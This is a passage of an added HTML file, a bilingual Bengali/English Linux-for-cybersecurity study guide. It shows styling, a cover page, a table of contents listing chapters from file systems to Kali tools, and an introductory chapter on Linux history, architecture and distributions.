@@ -1,0 +1,2799 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>সাইবার সিকিউরিটির জন্য Linux — সম্পূর্ণ গাইড</title>
+<link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;400;500;600;700&family=Noto+Sans+Bengali:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --primary: #0d1b2a;
+    --secondary: #1b2838;
+    --accent: #e63946;
+    --green: #2dc653;
+    --yellow: #ffd60a;
+    --blue: #0077b6;
+    --purple: #7b2d8b;
+    --orange: #f4831f;
+    --code-bg: #0d1117;
+    --code-border: #30363d;
+    --text: #1a1a2e;
+    --bg: #f0f2f5;
+    --card: #ffffff;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Hind Siliguri', 'Noto Sans Bengali', sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    font-size: 14px;
+    line-height: 1.9;
+  }
+
+
+  /* COVER */
+  .cover {
+    background: linear-gradient(135deg, #0d1b2a 0%, #1b2838 50%, #16213e 100%);
+    color: white; min-height: 100vh;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    text-align: center; padding: 60px 40px;
+    page-break-after: always; position: relative; overflow: hidden;
+  }
+  .cover::before {
+    content: '';
+    position: absolute; top: 0; left: 0; right: 0; bottom: 0;
+    background: repeating-linear-gradient(
+      0deg, transparent, transparent 30px,
+      rgba(45,198,83,0.03) 30px, rgba(45,198,83,0.03) 31px
+    );
+  }
+  .cover-icon { font-size: 90px; margin-bottom: 20px; position: relative; }
+  .cover h1 { font-size: 42px; font-weight: 700; color: var(--green); text-shadow: 0 0 30px rgba(45,198,83,0.5); }
+  .cover h2 { font-size: 24px; font-weight: 400; opacity: 0.8; margin: 10px 0 25px; }
+  .cover .divider { width: 120px; height: 3px; background: var(--accent); margin: 20px auto; border-radius: 2px; }
+  .cover .desc { font-size: 16px; opacity: 0.7; max-width: 650px; line-height: 2; }
+  .cover .badges { margin-top: 30px; }
+  .cover .badge {
+    display: inline-block; background: rgba(45,198,83,0.15);
+    border: 1px solid rgba(45,198,83,0.3); padding: 6px 18px;
+    border-radius: 20px; margin: 5px; font-size: 13px; color: #a8dadc;
+  }
+  .cover .terminal {
+    background: rgba(0,0,0,0.5); border: 1px solid rgba(45,198,83,0.3);
+    border-radius: 10px; padding: 20px 30px; margin-top: 30px;
+    font-family: 'Courier New', monospace; font-size: 14px;
+    color: var(--green); text-align: left; max-width: 500px;
+  }
+  .cover .terminal .prompt { color: #89b4fa; }
+
+  /* TOC */
+  .toc { background: white; padding: 50px 60px; page-break-after: always; }
+  .toc-header { font-size: 30px; color: var(--primary); border-bottom: 4px solid var(--green); padding-bottom: 15px; margin-bottom: 35px; }
+  .toc-chapter { margin-bottom: 5px; }
+  .toc-main { display: flex; justify-content: space-between; padding: 10px 0; font-weight: 700; font-size: 16px; color: var(--primary); border-bottom: 1px solid #eee; margin-top: 15px; }
+  .toc-main .num { color: var(--green); margin-right: 10px; }
+  .toc-sub { display: flex; justify-content: space-between; padding: 5px 0 5px 30px; color: #666; font-size: 13.5px; border-bottom: 1px dotted #f0f0f0; }
+
+  /* CHAPTERS */
+  .chapter { background: white; margin: 0; page-break-before: always; }
+  .chapter-header {
+    padding: 40px 55px; position: relative; overflow: hidden;
+  }
+  .ch1 .chapter-header { background: linear-gradient(135deg, #0d1b2a, #1b3a4b); }
+  .ch2 .chapter-header { background: linear-gradient(135deg, #1b2838, #2d3561); }
+  .ch3 .chapter-header { background: linear-gradient(135deg, #16213e, #0f3460); }
+  .ch4 .chapter-header { background: linear-gradient(135deg, #1a1a2e, #16213e); }
+  .ch5 .chapter-header { background: linear-gradient(135deg, #0d1b2a, #1a3c34); }
+  .ch6 .chapter-header { background: linear-gradient(135deg, #2d1b69, #3d2b8e); }
+  .ch7 .chapter-header { background: linear-gradient(135deg, #1b0000, #4a0000); }
+  .ch8 .chapter-header { background: linear-gradient(135deg, #0d2818, #1a4731); }
+  .ch9 .chapter-header { background: linear-gradient(135deg, #1a1000, #3d2800); }
+  .ch10 .chapter-header { background: linear-gradient(135deg, #0d0d2b, #1a1a4f); }
+  .ch11 .chapter-header { background: linear-gradient(135deg, #1a0d26, #3d1f5c); }
+  .ch12 .chapter-header { background: linear-gradient(135deg, #0d1a0d, #1a3a1a); }
+
+  .chapter-header::after {
+    content: ''; position: absolute; top: -30px; right: -30px;
+    width: 150px; height: 150px; border-radius: 50%;
+    background: rgba(255,255,255,0.03);
+  }
+  .chapter-label { font-size: 11px; letter-spacing: 4px; color: var(--green); text-transform: uppercase; margin-bottom: 10px; }
+  .chapter-title { font-size: 30px; color: white; font-weight: 700; }
+  .chapter-desc { font-size: 14px; color: rgba(255,255,255,0.6); margin-top: 8px; }
+  .chapter-body { padding: 40px 55px; }
+
+  /* HEADINGS */
+  h2.sec { font-size: 22px; color: var(--primary); margin: 35px 0 15px; padding-left: 18px; border-left: 5px solid var(--green); }
+  h3.sub { font-size: 17px; color: #1b3a4b; margin: 25px 0 12px; padding-bottom: 6px; border-bottom: 2px dashed #e0e0e0; }
+  h4.mini { font-size: 15px; color: #333; margin: 18px 0 8px; font-weight: 600; }
+  p { margin-bottom: 14px; text-align: justify; }
+
+  /* CODE */
+  .code {
+    background: var(--code-bg); color: #c9d1d9;
+    padding: 20px 25px; border-radius: 10px;
+    font-family: 'Courier New', monospace; font-size: 13px;
+    margin: 18px 0; line-height: 1.8; overflow-x: auto;
+    border: 1px solid var(--code-border);
+    border-left: 4px solid var(--green);
+  }
+  .code .c { color: #6e7681; } /* comment */
+  .code .k { color: #ff7b72; } /* keyword */
+  .code .s { color: #a5d6ff; } /* string */
+  .code .p { color: #f0883e; } /* prompt */
+  .code .g { color: var(--green); } /* green highlight */
+  .code .y { color: #e3b341; } /* yellow */
+  .code .r { color: #ff7b72; } /* red/error */
+  code { background: #1b2838; color: #79c0ff; padding: 2px 8px; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 13px; }
+
+  /* BOXES */
+  .box { padding: 18px 22px; border-radius: 10px; margin: 20px 0; border-left: 5px solid; }
+  .info { background: #e8f4fd; border-color: #0077b6; color: #023e8a; }
+  .warn { background: #fff8e6; border-color: #f4831f; color: #7b3f00; }
+  .danger { background: #fde8ea; border-color: #e63946; color: #9b1d20; }
+  .success { background: #e8f8ed; border-color: #2dc653; color: #1a4731; }
+  .purple-box { background: #f3e8ff; border-color: #7b2d8b; color: #4a0072; }
+  .box-t { font-weight: 700; margin-bottom: 8px; font-size: 15px; }
+
+  /* TABLES */
+  table { width: 100%; border-collapse: collapse; margin: 20px 0; font-size: 13.5px; }
+  thead tr { background: var(--primary); color: white; }
+  th { padding: 12px 15px; text-align: left; font-weight: 600; }
+  td { padding: 10px 15px; border-bottom: 1px solid #eee; }
+  tr:nth-child(even) { background: #f8f9fa; }
+  tr:hover { background: #e8f8ed; }
+
+  /* DIAGRAM */
+  .diagram {
+    background: #0d1117; border: 1px solid #30363d;
+    border-radius: 10px; padding: 22px; font-family: 'Courier New', monospace;
+    font-size: 13px; line-height: 1.9; margin: 20px 0; color: #c9d1d9;
+    overflow-x: auto;
+  }
+  .diagram .dg { color: var(--green); }
+  .diagram .dy { color: #e3b341; }
+  .diagram .db { color: #79c0ff; }
+  .diagram .dr { color: #ff7b72; }
+
+  /* GRID */
+  .grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 18px; margin: 20px 0; }
+  .grid3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px; margin: 20px 0; }
+  .card { background: #f8f9fa; border: 1px solid #e0e0e0; border-radius: 10px; padding: 18px; }
+  .card h4 { color: var(--primary); margin-bottom: 10px; font-size: 15px; border-bottom: 2px solid var(--green); padding-bottom: 6px; }
+  .card.danger-card { border-color: var(--accent); }
+  .card.danger-card h4 { color: var(--accent); border-color: var(--accent); }
+  .card.success-card { border-color: var(--green); }
+  .card.success-card h4 { color: #1a4731; border-color: var(--green); }
+
+  /* PERM TABLE */
+  .perm-visual { display: flex; gap: 5px; margin: 15px 0; font-family: 'Courier New', monospace; }
+  .perm-block { padding: 8px 12px; border-radius: 6px; text-align: center; font-size: 13px; font-weight: 700; }
+  .perm-r { background: #fde8ea; color: #c1121f; }
+  .perm-w { background: #fff3cd; color: #856404; }
+  .perm-x { background: #d1e7dd; color: #0f5132; }
+  .perm-n { background: #f0f0f0; color: #999; }
+
+  /* BADGE */
+  .badge { display: inline-block; padding: 3px 10px; border-radius: 12px; font-size: 12px; font-weight: 600; margin: 2px; }
+  .badge-g { background: #d1e7dd; color: #0f5132; }
+  .badge-r { background: #fde8ea; color: #c1121f; }
+  .badge-y { background: #fff3cd; color: #856404; }
+  .badge-b { background: #cfe2ff; color: #084298; }
+  .badge-p { background: #f3e8ff; color: #4a0072; }
+
+  /* HIGHLIGHT */
+  .hl { background: linear-gradient(135deg, #fff9c4, #fff3e0); border: 1px solid #ffd60a; padding: 15px 20px; border-radius: 8px; margin: 18px 0; }
+  .chapter-summary { background: linear-gradient(135deg, #0d1b2a, #1b2838); color: white; border-radius: 12px; padding: 25px 30px; margin-top: 40px; }
+  .chapter-summary h3 { color: var(--green); margin-bottom: 15px; font-size: 18px; }
+  .chapter-summary li { color: rgba(255,255,255,0.85); margin-bottom: 6px; }
+
+  ul, ol { margin: 12px 0 12px 25px; line-height: 2; }
+  li { margin-bottom: 4px; }
+
+  @media print {
+    .print-btn { display: none; }
+    body { background: white; }
+    .chapter { margin: 0; }
+    .cover, .chapter-header, thead tr { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    .code, .diagram { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+  }
+
+  /* ═══ DARK / LIGHT THEME ═══ */
+  body.light-mode {
+    --bg: #f0f2f5;
+    --card: #ffffff;
+    --text: #1a1a2e;
+    --code-bg: #0d1117;
+    --code-border: #30363d;
+    --toc-bg: #ffffff;
+    --ch-body-bg: #ffffff;
+  }
+  body.dark-mode {
+    --bg: #0a0f1a;
+    --card: #111827;
+    --text: #e2e8f0;
+    --code-bg: #050a12;
+    --code-border: #1f2937;
+    --toc-bg: #111827;
+    --ch-body-bg: #111827;
+  }
+  body { background: var(--bg); color: var(--text); transition: background 0.3s, color 0.3s; }
+  body.dark-mode .toc { background: var(--toc-bg); color: var(--text); }
+  body.dark-mode .chapter { background: var(--ch-body-bg); }
+  body.dark-mode .chapter-body { background: var(--ch-body-bg); }
+  body.dark-mode h2.sec { color: #a8dadc; }
+  body.dark-mode h3.sub { color: #90cdf4; border-color: #2d3748; }
+  body.dark-mode p { color: var(--text); }
+  body.dark-mode .toc-main { color: #e2e8f0; border-color: #2d3748; }
+  body.dark-mode .toc-header { color: #e2e8f0; }
+  body.dark-mode .toc-sub { color: #94a3b8; }
+  body.dark-mode table { color: var(--text); }
+  body.dark-mode td { border-color: #2d3748; color: var(--text); }
+  body.dark-mode tr:nth-child(even) { background: #1a2332; }
+  body.dark-mode tr:hover { background: #1a3a2a; }
+  body.dark-mode .card { background: #1a2332; border-color: #2d3748; color: var(--text); }
+  body.dark-mode .card h4 { color: #90cdf4; }
+  body.dark-mode .info { background: #0c2340; color: #90cdf4; }
+  body.dark-mode .warn { background: #2a1a00; color: #fbbf24; }
+  body.dark-mode .danger { background: #2a0a0a; color: #fc8181; }
+  body.dark-mode .success { background: #0a2a15; color: #6ee7b7; }
+  body.dark-mode .purple-box { background: #1a0a2a; color: #d8b4fe; }
+  body.dark-mode .hl { background: #2a2000; border-color: #854d0e; color: #fbbf24; }
+  body.dark-mode code { background: #1e293b; color: #93c5fd; }
+  body.dark-mode .diagram { background: #050a12; }
+
+  /* ═══ BILINGUAL ═══ */
+  .en-text { display: none; }
+  .bn-text { display: inline; }
+  body.lang-en .bn-text { display: none; }
+  body.lang-en .en-text { display: inline; }
+  .en-block { display: none; }
+  .bn-block { display: block; }
+  body.lang-en .bn-block { display: none; }
+  body.lang-en .en-block { display: block; }
+
+  /* ═══ TOGGLE BUTTONS ═══ */
+  .top-controls {
+    position: fixed; top: 20px; right: 20px;
+    display: flex; gap: 10px; z-index: 9999; align-items: center;
+  }
+  .ctrl-btn {
+    border: none; padding: 10px 18px; border-radius: 8px;
+    font-size: 14px; font-family: inherit; cursor: pointer;
+    transition: all 0.3s; font-weight: 600; box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+  }
+  .lang-btn { background: #0077b6; color: white; }
+  .lang-btn:hover { background: #005f8e; transform: translateY(-2px); }
+  .theme-btn { background: #2dc653; color: #0d1b2a; }
+  .theme-btn:hover { background: #25a344; transform: translateY(-2px); }
+  .print-btn { background: var(--accent); color: white; border: none; padding: 10px 18px; border-radius: 8px; font-size: 14px; font-family: inherit; cursor: pointer; transition: all 0.3s; font-weight: 600; box-shadow: 0 4px 15px rgba(230,57,70,0.4); }
+  .print-btn:hover { background: #c1121f; transform: translateY(-2px); }
+
+  /* ═══ ROADMAP ═══ */
+  .roadmap-container { padding: 20px 0; }
+  .roadmap-phase {
+    display: flex; gap: 20px; margin-bottom: 30px; align-items: flex-start;
+  }
+  .phase-number {
+    min-width: 52px; height: 52px; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 20px; font-weight: 800; color: white; flex-shrink: 0;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+  }
+  .phase-content { flex: 1; }
+  .phase-title { font-size: 18px; font-weight: 700; margin-bottom: 8px; }
+  .phase-desc { font-size: 13.5px; color: #555; margin-bottom: 10px; }
+  body.dark-mode .phase-desc { color: #94a3b8; }
+  .phase-items { display: flex; flex-wrap: wrap; gap: 8px; }
+  .phase-item {
+    padding: 5px 14px; border-radius: 20px;
+    font-size: 12.5px; font-weight: 600;
+    border: 1.5px solid currentColor;
+  }
+  .roadmap-arrow { text-align: center; font-size: 28px; color: var(--green); margin: -15px 0 10px 26px; }
+
+  /* ═══ CHEATSHEET ═══ */
+  .cheat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin: 20px 0; }
+  @media (max-width: 768px) { .cheat-grid { grid-template-columns: 1fr; } .grid2, .grid3 { grid-template-columns: 1fr; } }
+  .cheat-card { background: var(--card); border: 1px solid #e0e0e0; border-radius: 10px; overflow: hidden; }
+  body.dark-mode .cheat-card { border-color: #2d3748; }
+  .cheat-card-header { padding: 10px 16px; font-weight: 700; font-size: 14px; color: white; }
+  .cheat-card-body { padding: 0; }
+  .cheat-row { display: flex; padding: 6px 14px; border-bottom: 1px solid #f0f0f0; font-size: 12.5px; gap: 12px; }
+  body.dark-mode .cheat-row { border-color: #1f2937; }
+  .cheat-row:last-child { border-bottom: none; }
+  .cheat-cmd { font-family: 'Courier New', monospace; color: #0077b6; font-weight: 600; min-width: 160px; white-space: nowrap; }
+  body.dark-mode .cheat-cmd { color: #60a5fa; }
+  .cheat-desc { color: #555; }
+  body.dark-mode .cheat-desc { color: #94a3b8; }
+
+  @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+
+  @media print { .top-controls { display: none; } }
+
+</style>
+</head>
+<body>
+
+<div class="top-controls">
+  <button class="print-btn ctrl-btn" onclick="window.print()">🖨️ PDF</button>
+  <button class="theme-btn ctrl-btn" onclick="toggleTheme()" id="themeBtn">🌙 Dark Mode</button>
+  <button class="lang-btn ctrl-btn" onclick="toggleLang()" id="langBtn">🇬🇧 English</button>
+</div>
+
+<!-- ═══ COVER ═══ -->
+<div class="cover">
+  <div class="cover-icon">🐧</div>
+  <h1>Linux for Cyber Security</h1>
+  <h2><span class="bn-text">সাইবার সিকিউরিটির জন্য Linux — সম্পূর্ণ বাংলা গাইড</span><span class="en-text">Linux for Cyber Security — Complete Guide</span></h2>
+  <div class="divider"></div>
+  <p class="desc"><span class="bn-text">Linux ব্যাসিক থেকে শুরু করে Privilege Escalation, Forensics, Hardening, Kali Linux Tools — সাইবার সিকিউরিটিতে যা যা দরকার সব কিছু এক জায়গায়।</span><span class="en-text">From Linux basics to Privilege Escalation, Forensics, Hardening, and Kali Linux Tools — everything you need for cybersecurity in one place.</span></p>
+  <div class="terminal">
+    <div><span class="prompt">root@kali</span>:~# whoami</div>
+    <div style="color:#fff">future_cybersecurity_expert</div>
+    <div><span class="prompt">root@kali</span>:~# cat mission.txt</div>
+    <div style="color:#fff"><span class="bn-text">Linux শেখো → হ্যাক করতে শেখো → রক্ষা করতে শেখো</span><span class="en-text">Learn Linux → Learn to Hack → Learn to Defend</span></div>
+    <div style="animation: blink 1s infinite;">█</div>
+  </div>
+  <div class="badges">
+    <span class="badge">📁 ফাইল সিস্টেম</span>
+    <span class="badge">👤 User Management</span>
+    <span class="badge">🔐 Permissions</span>
+    <span class="badge">🌐 Networking</span>
+    <span class="badge">⚙️ Process Management</span>
+    <span class="badge">🛡️ Hardening</span>
+    <span class="badge">⬆️ Privilege Escalation</span>
+    <span class="badge">🔍 Forensics</span>
+    <span class="badge">📜 Shell Scripting</span>
+    <span class="badge">🗡️ Kali Linux Tools</span>
+  </div>
+</div>
+
+<!-- ═══ TOC ═══ -->
+<div class="toc">
+  <div class="toc-header"><span class="bn-text">📋 বিষয়সূচি — সম্পূর্ণ তালিকা</span><span class="en-text">📋 Table of Contents — Full List</span></div>
+
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০১</span> Linux পরিচিতি ও ইতিহাস</span></div>
+    <div class="toc-sub"><span>Linux কী, Kernel, Distribution, <span class="bn-text">কেন Cyber Security-তে Linux?</span><span class="en-text">Why Linux for Cyber Security?</span></span></div>
+    <div class="toc-sub"><span>Kali vs Parrot vs Ubuntu vs Arch</span></div>
+  </div>
+
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০২</span> Linux ফাইল সিস্টেম ও ডিরেক্টরি</span></div>
+    <div class="toc-sub"><span>FHS — Filesystem Hierarchy Standard, প্রতিটি ডিরেক্টরির কাজ</span></div>
+    <div class="toc-sub"><span><span class="bn-text">সিকিউরিটি-গুরুত্বপূর্ণ ফাইল ও ডিরেক্টরি</span><span class="en-text">Security-Critical Files & Directories</span></span></div>
+  </div>
+
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০৩</span> Linux বেসিক কমান্ড (সম্পূর্ণ)</span></div>
+    <div class="toc-sub"><span>Navigation, File Operations, Text Processing</span></div>
+    <div class="toc-sub"><span>grep, awk, sed, find, xargs — Power Tools</span></div>
+    <div class="toc-sub"><span>Pipe, Redirection, Wildcards</span></div>
+  </div>
+
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০৪</span> ফাইল পার্মিশন ও Access Control</span></div>
+    <div class="toc-sub"><span>rwx, Octal Notation, chmod, chown, chgrp</span></div>
+    <div class="toc-sub"><span>SUID, SGID, Sticky Bit — Privilege Escalation ভেক্টর</span></div>
+    <div class="toc-sub"><span>ACL, umask</span></div>
+  </div>
+
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০৫</span> User ও Group ব্যবস্থাপনা</span></div>
+    <div class="toc-sub"><span>/etc/passwd, /etc/shadow, /etc/group</span></div>
+    <div class="toc-sub"><span>useradd, usermod, passwd, sudo</span></div>
+    <div class="toc-sub"><span>sudoers ফাইল ও Privilege Escalation</span></div>
+  </div>
+
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০৬</span> প্রসেস ব্যবস্থাপনা</span></div>
+    <div class="toc-sub"><span>ps, top, htop, kill, jobs, bg, fg</span></div>
+    <div class="toc-sub"><span>Cron Jobs — Persistence ও Automation</span></div>
+    <div class="toc-sub"><span>systemd ও Service Management</span></div>
+  </div>
+
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০৭</span> নেটওয়ার্কিং কমান্ড</span></div>
+    <div class="toc-sub"><span>ip, ifconfig, netstat, ss, route</span></div>
+    <div class="toc-sub"><span>SSH বিস্তারিত, Port Forwarding, Tunneling</span></div>
+    <div class="toc-sub"><span><span class="bn-text">Firewall — iptables</span><span class="en-text">Firewall — iptables</span> ও ufw</span></div>
+  </div>
+
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০৮</span> Linux সিকিউরিটি হার্ডেনিং</span></div>
+    <div class="toc-sub"><span><span class="bn-text">SSH Hardening</span><span class="en-text">SSH Hardening</span>, Firewall Setup</span></div>
+    <div class="toc-sub"><span>Fail2Ban, PAM, AppArmor/SELinux</span></div>
+    <div class="toc-sub"><span><span class="bn-text">Audit ও Monitoring</span><span class="en-text">Audit & Monitoring</span></span></div>
+  </div>
+
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০৯</span> Privilege Escalation (Linux)</span></div>
+    <div class="toc-sub"><span><span class="bn-text">SUID/SGID Exploit</span><span class="en-text">SUID/SGID Exploit</span>, Sudo Misconfig</span></div>
+    <div class="toc-sub"><span>Cron Job Hijack, <span class="bn-text">PATH Injection</span><span class="en-text">PATH Injection</span>, <span class="bn-text">Kernel Exploit</span><span class="en-text">Kernel Exploit</span></span></div>
+    <div class="toc-sub"><span>LinPEAS, GTFOBins — Enumeration টুল</span></div>
+  </div>
+
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">১০</span> Log ব্যবস্থাপনা ও Forensics</span></div>
+    <div class="toc-sub"><span>গুরুত্বপূর্ণ Log ফাইল, journalctl</span></div>
+    <div class="toc-sub"><span>Incident Response, <span class="bn-text">আক্রান্ত সিস্টেম বিশ্লেষণ</span><span class="en-text">Analyzing a Compromised System</span></span></div>
+    <div class="toc-sub"><span>File Carving, Metadata Analysis</span></div>
+  </div>
+
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">১১</span> Shell Scripting for Security</span></div>
+    <div class="toc-sub"><span>Bash Scripting মূল ধারণা</span></div>
+    <div class="toc-sub"><span>Security Automation Script</span></div>
+    <div class="toc-sub"><span><span class="bn-text">Reverse Shell Script</span><span class="en-text">Reverse Shell Script</span></span></div>
+  </div>
+
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">১২</span> Kali Linux — সম্পূর্ণ টুল গাইড</span></div>
+    <div class="toc-sub"><span>Reconnaissance, Scanning, Exploitation</span></div>
+    <div class="toc-sub"><span><span class="bn-text">Post-Exploitation</span><span class="en-text">Post-Exploitation</span>, <span class="bn-text">Password Attacks</span><span class="en-text">Password Attacks</span>, Wireless</span></div>
+    <div class="toc-sub"><span>Metasploit Framework বিস্তারিত</span></div>
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════
+     CHAPTER 1: Linux পরিচিতি
+════════════════════════════════════════ -->
+<div class="chapter ch1">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 01</div>
+    <div class="chapter-title"><span class="bn-text">🐧 Linux পরিচিতি ও ইতিহাস</span><span class="en-text">🐧 Introduction to Linux & History</span></div>
+    <div class="chapter-desc"><span class="bn-text">Linux কী, কেন শিখবে, কোন Distribution ব্যবহার করবে</span><span class="en-text">What is Linux, why learn it, which distribution to use</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">Linux কী?</span><span class="en-text">What is Linux?</span></h2>
+    <p>Linux হলো একটি ওপেন সোর্স অপারেটিং সিস্টেম Kernel যা ১৯৯১ সালে <strong>Linus Torvalds</strong> তৈরি করেছিলেন। এটি Unix-এর আদলে তৈরি কিন্তু সম্পূর্ণ আলাদা কোড। Linux Kernel + GNU Tools + অন্যান্য সফটওয়্যার মিলে একটি পূর্ণাঙ্গ OS তৈরি হয় যাকে Linux Distribution বলে।</p>
+
+    <div class="diagram">
+<pre><span class="db">Linux Architecture:</span>
+
+┌─────────────────────────────────────────────┐
+│              User Space                      │
+│  ┌─────────┐ ┌─────────┐ ┌───────────────┐  │
+│  │  bash   │ │ Firefox │ │  Wireshark    │  │
+│  └────┬────┘ └────┬────┘ └───────┬───────┘  │
+│       │           │               │           │
+│  ┌────▼───────────▼───────────────▼────────┐ │
+│  │         GNU C Library (glibc)            │ │
+│  └────────────────┬────────────────────────┘ │
+└───────────────────│─────────────────────────┘
+                    │ System Calls
+┌───────────────────▼─────────────────────────┐
+│               Kernel Space                   │
+│  ┌──────────┐ ┌──────────┐ ┌─────────────┐  │
+│  │ Process  │ │ Memory   │ │   Network   │  │
+│  │ Manager  │ │ Manager  │ │   Stack     │  │
+│  └──────────┘ └──────────┘ └─────────────┘  │
+│  ┌──────────────────────────────────────────┐│
+│  │         Device Drivers                   ││
+│  └──────────────────────────────────────────┘│
+└─────────────────────────────────────────────┘
+              Hardware (CPU, RAM, Disk)
+</pre>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Kernel কী?</span><span class="en-text">What is a Kernel?</span></h2>
+    <p>Kernel হলো OS-এর কেন্দ্রীয় অংশ। এটি Hardware ও Software-এর মধ্যে মধ্যস্থতা করে। সিকিউরিটির দৃষ্টিকোণ থেকে — Kernel Exploit হলো সবচেয়ে শক্তিশালী অ্যাটাক কারণ এটি পুরো সিস্টেমের নিয়ন্ত্রণ দেয়।</p>
+
+    <h2 class="sec"><span class="bn-text">কেন Cyber Security-তে Linux?</span><span class="en-text">Why Linux for Cyber Security?</span></h2>
+    <div class="grid2">
+      <div class="card success-card">
+        <h4>✅ Linux ব্যবহারের কারণ</h4>
+        <ul>
+          <li>বেশিরভাগ সার্ভার Linux চালায় (৯০%+)</li>
+          <li>Kali, Parrot — সব hacking OS Linux-based</li>
+          <li>Command-line শক্তিশালী automation</li>
+          <li>ওপেন সোর্স — সোর্স কোড দেখা যায়</li>
+          <li>Root access সহজ</li>
+          <li>সব সিকিউরিটি টুল Linux-এ চলে</li>
+          <li>Memory ও Process সহজে বিশ্লেষণ</li>
+        </ul>
+      </div>
+      <div class="card danger-card">
+        <h4>⚠️ Linux ছাড়া Hacking কঠিন কেন?</h4>
+        <ul>
+          <li>Metasploit, Nmap, Wireshark সব Linux-optimized</li>
+          <li>Windows-এ অনেক টুল কাজ করে না</li>
+          <li>Shell scripting automation</li>
+          <li>CTF সব Linux-এ</li>
+          <li>Bug Bounty Lab environment</li>
+          <li>Docker, VirtualBox management</li>
+          <li>Penetration Testing certifications (OSCP) সব Linux</li>
+        </ul>
+      </div>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Linux Distributions তুলনা</span><span class="en-text">Linux Distributions Comparison</span></h2>
+    <table>
+      <thead><tr><th>Distribution</th><th>Base</th><th>উদ্দেশ্য</th><th>সিকিউরিটি ব্যবহার</th><th>কঠিনতা</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Kali Linux</strong></td><td>Debian</td><td>Penetration Testing</td><td>⭐⭐⭐⭐⭐ সেরা</td><td>মাঝারি</td></tr>
+        <tr><td><strong>Parrot OS</strong></td><td>Debian</td><td>Security + Privacy</td><td>⭐⭐⭐⭐ ভালো</td><td>সহজ</td></tr>
+        <tr><td><strong>Ubuntu</strong></td><td>Debian</td><td>General Purpose</td><td>⭐⭐⭐ ঠিক আছে</td><td>সহজ</td></tr>
+        <tr><td><strong>Arch Linux</strong></td><td>Independent</td><td>Customizable</td><td>⭐⭐⭐ কাস্টম</td><td>কঠিন</td></tr>
+        <tr><td><strong>BlackArch</strong></td><td>Arch</td><td>Pentesting</td><td>⭐⭐⭐⭐⭐ ২৮০০+ টুল</td><td>কঠিন</td></tr>
+        <tr><td><strong>REMnux</strong></td><td>Ubuntu</td><td>Malware Analysis</td><td>⭐⭐⭐⭐⭐ Forensics</td><td>মাঝারি</td></tr>
+        <tr><td><strong>TAILS</strong></td><td>Debian</td><td>Anonymity</td><td>⭐⭐⭐⭐ Privacy</td><td>সহজ</td></tr>
+        <tr><td><strong>Fedora</strong></td><td>RPM</td><td>Development</td><td>⭐⭐⭐ SELinux built-in</td><td>মাঝারি</td></tr>
+      </tbody>
+    </table>
+
+    <div class="box info">
+      <div class="box-t"><span class="bn-text">💡 তোমার জন্য সাজেশন</span><span class="en-text">💡 Suggestion for You</span></div>
+      তুমি Kali Linux ব্যবহার করো — এটাই সঠিক পছন্দ। Kali-তে ৬০০+ সিকিউরিটি টুল pre-installed। তবে Kali-কে daily driver হিসেবে ব্যবহার না করে VirtualBox-এ রাখাই ভালো।
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Linux vs Windows — সিকিউরিটি দৃষ্টিকোণ</span><span class="en-text">Linux vs Windows — Security Perspective</span></h2>
+    <table>
+      <thead><tr><th>বিষয়</th><th>Linux</th><th>Windows</th></tr></thead>
+      <tbody>
+        <tr><td>ডিফল্ট User</td><td>Non-root (নিরাপদ)</td><td>Admin (ঝুঁকিপূর্ণ)</td></tr>
+        <tr><td>ভাইরাস সংখ্যা</td><td>অনেক কম</td><td>লক্ষাধিক</td></tr>
+        <tr><td>Source Code</td><td>Open (দেখা যায়)</td><td>Closed (লুকানো)</td></tr>
+        <tr><td>Patching</td><td>দ্রুত</td><td>ধীর</td></tr>
+        <tr><td>Log Access</td><td>সহজ (/var/log)</td><td>Event Viewer (জটিল)</td></tr>
+        <tr><td>Process Control</td><td>শক্তিশালী</td><td>সীমিত</td></tr>
+        <tr><td>Attack টার্গেট</td><td>সার্ভার অ্যাটাক বেশি</td><td>Desktop অ্যাটাক বেশি</td></tr>
+      </tbody>
+    </table>
+
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════
+     CHAPTER 2: ফাইল সিস্টেম
+════════════════════════════════════════ -->
+<div class="chapter ch2">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 02</div>
+    <div class="chapter-title"><span class="bn-text">📁 Linux ফাইল সিস্টেম ও ডিরেক্টরি</span><span class="en-text">📁 Linux File System & Directories</span></div>
